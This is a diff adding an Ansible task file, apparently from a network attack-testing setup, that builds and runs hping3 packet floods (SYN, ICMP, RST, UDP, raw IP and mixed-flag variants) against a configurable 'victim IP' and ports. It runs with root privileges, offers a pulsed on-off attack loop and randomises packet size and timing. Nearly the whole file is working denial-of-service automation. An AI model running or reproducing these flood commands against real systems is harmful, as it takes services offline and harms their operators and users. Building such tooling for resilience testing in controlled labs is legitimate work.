@@ -1,0 +1,66 @@
+--- 
+
+# ddos_duration_sec - number of secs for ddos atttack
+# ddos_target_ip - victim IP
+# ddos_target_ports - victim ports
+
+- name: include default step variables
+  include_vars: "./vars/attacks/attacks_pool.yaml"
+
+- name: available ddos types definitions
+  set_fact:
+    pulse_time: "{{ ddos_pulse_sec | default(0) }}"
+    ddos_types:
+      syn_flood:         "/usr/sbin/hping3 -d $RAND_PKT_SIZE -S -w 64             -i u$RAND_PKT_BACKOFF -E /dev/urandom -p $T_PORTS $T_ADDR"
+      icmp_flood:        "/usr/sbin/hping3 -d $RAND_PKT_SIZE -1                   -i u$RAND_PKT_BACKOFF  -E /dev/urandom             $T_ADDR"
+      syn_ack_fin_flood: "/usr/sbin/hping3 -d $RAND_PKT_SIZE -F -S -A             -i u$RAND_PKT_BACKOFF  -E /dev/urandom -p $T_PORTS $T_ADDR"
+      rst_flood:         "/usr/sbin/hping3 -d $RAND_PKT_SIZE -R                   -i u$RAND_PKT_BACKOFF  -E /dev/urandom -p $T_PORTS $T_ADDR"
+      no_l4_flood:       "/usr/sbin/hping3 -d $RAND_PKT_SIZE --rawip              -i u$RAND_PKT_BACKOFF                              $T_ADDR"
+      udp_flood:         "/usr/sbin/hping3 -d $RAND_PKT_SIZE -2                   -i u$RAND_PKT_BACKOFF  -E /dev/urandom -p $T_PORTS $T_ADDR"
+
+# select requested ddos type
+- name: define ddos command 1/3
+  set_fact:
+    # DO NOT USE --flood param!!! Dangerous
+    # synflood 10 pkts per sec (-i $RAND_PKT_BACKOFF00)
+    # ddos_command: "/usr/sbin/hping3 -d 256 -S -w 64 -p $T_PORTS -i $RAND_PKT_BACKOFF $T_ADDR"
+    ddos_command_unexploded: "{{ ddos_types.get(ddos_type|default('syn_flood')) }}"
+  delegate_to: localhost
+  run_once: yes
+
+# fill command variables
+- name: define ddos command 2/3
+  set_fact:
+    ddos_command: "{{ ddos_command_unexploded | replace('$T_ADDR',ddos_target_ip)|replace('$T_PORTS', ddos_target_ports) | replace('$RAND_PKT_SIZE', range(10, 1200) | random)  | replace('$RAND_PKT_BACKOFF', range(500, 1000) | random) }}"
+  delegate_to: localhost
+  run_once: yes
+
+# define command execution
+- name: define ddos command 3/3
+  set_fact:
+    ddos_command: "{{ ddos_command_unexploded | replace('$T_ADDR',ddos_target_ip)|replace('$T_PORTS', ddos_target_ports) | replace('$RAND_PKT_SIZE', range(10, 1200) | random)  | replace('$RAND_PKT_BACKOFF', range(500, 1000) | random) }}"
+    ddos_command_nice: "nice -20  {{ ddos_command }}"
+    ddos_command_pulse: "while $(/bin/true); do timeout {{ pulse_time }}s {{ ddos_command }}; sleep {{ pulse_time }}s; done" 
+  delegate_to: localhost
+  run_once: yes
+
+- name: "ddos execution - {{ ddos_command }} - pulse {{pulse_time}} sec"
+  shell:
+    cmd: "{{ ddos_command if pulse_time == '0' else ddos_command_pulse }}"
+    executable: "/bin/bash"
+  register: ddos_out
+  async: "{{ddos_duration_sec}}"
+  poll: "{{((ddos_duration_sec|int)/10+1)|round|int}}"
+  become: yes
+  failed_when:
+    - ddos_out.msg | default('') is not match("async task did not complete within the requested time.*")
+    - ddos_out.rc | default('0') != 0
+
+- name: "Ensure no ddos is running anymore"
+  shell:
+    cmd: "/usr/bin/killall hping3"
+    executable: "/bin/bash" 
+  become: yes
+  ignore_errors: true
+  failed_when: false
+
